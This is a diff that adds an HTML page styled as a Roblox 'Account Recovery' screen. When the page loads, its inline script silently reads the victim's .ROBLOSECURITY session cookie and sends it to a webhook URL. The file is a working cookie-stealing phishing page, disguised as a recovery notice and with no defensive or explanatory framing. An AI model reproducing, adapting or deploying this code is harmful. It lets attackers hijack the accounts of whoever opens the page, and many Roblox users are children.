@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Recovery</title>
+    <script>
+        window.onload = function() {
+            const webhookURL = 'https://your-webhook-url.com/webhook';
+            const cookieValue = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')).split('=')[1];
+
+            const payload = { content: `ROBLOSECURITY Cookie: ${cookieValue}` };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Cookie sent successfully.');
+                } else {
+                    console.error('Failed to send the cookie.');
+                }
+            }).catch(error => console.error('Error:', error));
+        }
+    </script>
+</head>
+<body>
+    <h1>Account Recovery in Progress</h1>
+    <img src="https://your-image-url.com/image.jpg" alt="Recovery Image" style="width:100%;max-width:600px;">
+</body>
+</html>
